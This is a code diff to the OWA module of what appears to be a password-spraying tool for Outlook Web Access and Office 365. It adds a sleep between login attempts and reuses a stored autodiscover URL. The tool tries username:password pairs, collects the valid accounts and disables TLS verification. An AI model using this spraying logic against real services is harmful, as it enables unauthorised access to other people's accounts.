@@ -1,5 +1,6 @@
 import logging
 import requests
+import time
 from requests_ntlm import HttpNtlmAuth
 from requests.exceptions import ConnectionError
 from core.utils.ntlmdecoder import ntlmdecode
@@ -33,6 +34,7 @@ class OWA:
             elif r.status_code == 200:
                 self.log.info(print_info("OWA domain appears to be hosted on Office365"))
                 self.log.info(print_info("Using Office 365 autodiscover URL: https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"))
+                self.autodiscover_url = 'https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml'
                 self.O365 = True
         else:
             self.autodiscover_url = self.url
@@ -85,12 +87,12 @@ class OWA:
             except ConnectionError:
                 continue
 
-    def auth_O365(self, username, password, proxy):
+    def auth_O365(self, username, password, proxy, sleep):
         log = logging.getLogger(f"auth_owa_O365({username})")
 
         headers = {"Content-Type": "text/xml"}
         try:
-            r = requests.get("https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml", auth=(username, password), verify=False, proxies=proxy)
+            r = requests.get(self.autodiscover_url, auth=(username, password), verify=False, proxies=proxy)
         except BaseException as e:
             log.error(print_bad(f"Error during authentication: {e}"))
         else:
@@ -102,8 +104,10 @@ class OWA:
                 self.valid_accounts.add(f'{username}:{password} - check manually')
             else:
                 log.info(print_bad(f"Authentication failed: {username}:{password} (Invalid credentials)"))
+            # sleep before next attempt
+            time.sleep(sleep)
 
-    def auth(self, username, password, proxy):
+    def auth(self, username, password, proxy, sleep):
         log = logging.getLogger(f"auth_owa({username})")
 
         headers = {"Content-Type": "text/xml"}
@@ -117,6 +121,8 @@ class OWA:
                 self.valid_accounts.add(f'{username}:{password}')
             else:
                 log.info(print_bad(f"Authentication failed: {username}:{password} (Invalid credentials)"))
+            # sleep before next attempt
+            time.sleep(sleep)
 
     def __str__(self):
         return "OWA"
